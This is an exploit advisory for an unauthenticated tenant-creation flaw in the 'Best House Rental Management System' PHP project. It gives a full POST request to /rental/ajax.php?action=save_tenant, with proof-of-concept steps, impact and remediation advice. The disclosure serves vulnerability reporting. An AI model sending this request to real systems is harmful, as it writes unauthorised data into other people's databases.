
### **Best House Rental Management System Unauthorized Tenant Addition Vulnerability**

- **Exploit Title**: Best House Rental Management System Project in PHP Unauthorized Tenant Addition Vulnerability  
- **Exploit Author**: Yasser Alshammari  
- **Vendor Homepage**: [SourceCodester](https://www.sourcecodester.com/php/17375/best-courier-management-system-project-php.html)  
- **Software Link**: [Download Here](https://www.sourcecodester.com/download-code?nid=17375&title=Best+house+rental+management+system+project+in+php+)  
- **Version**: Best House Rental Management System Project in PHP v1.0  
- **Tested On**: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.12  
- **CVE**: Reported, waiting for CVE number  

---

### **Description**

The `/rental/ajax.php?action=save_tenant` endpoint in the **Best House Rental Management System Project in PHP v1.0** is vulnerable to unauthorized tenant addition. This occurs because the application does not validate user authentication or authorization before processing tenant addition requests. An attacker can exploit this vulnerability to add arbitrary tenant data, potentially corrupting the database.

---

### **Payload Used**

```sh
POST /rental/ajax.php?action=save_tenant HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------28015069973034201351287545916


-----------------------------28015069973034201351287545916
Content-Disposition: form-data; name="id"

12
-----------------------------28015069973034201351287545916
Content-Disposition: form-data; name="lastname"

Sharma
-----------------------------28015069973034201351287545916
Content-Disposition: form-data; name="firstname"

Rhea
-----------------------------28015069973034201351287545916
Content-Disposition: form-data; name="middlename"

Patel
-----------------------------28015069973034201351287545916
Content-Disposition: form-data; name="email"

rhea.sharma@example.com
-----------------------------28015069973034201351287545916
Content-Disposition: form-data; name="contact"

+91-8765432109
-----------------------------28015069973034201351287545916
Content-Disposition: form-data; name="house_id"

12
-----------------------------28015069973034201351287545916
Content-Disposition: form-data; name="date_in"

2024-05-23
-----------------------------28015069973034201351287545916--
```

---

### **Proof of Concept**

1. Submit the above POST request to the `/rental/ajax.php?action=save_tenant` endpoint.
2. Observe that the tenant record is successfully added to the database without requiring authentication or authorization.

---

### **Impact**

- An attacker can add fake tenant data, corrupting the database and disrupting business operations.
- This vulnerability can serve as a precursor to further attacks, such as:
  - Unauthorized access.
  - Privilege escalation.

---

### **Remediation**

- **Authentication**: Enforce authentication and authorization checks for all tenant addition requests.
- **Input Validation**: Validate and sanitize all user inputs to prevent injection of malicious data.
- **Rate Limiting**: Implement rate-limiting mechanisms to prevent abuse of the endpoint.
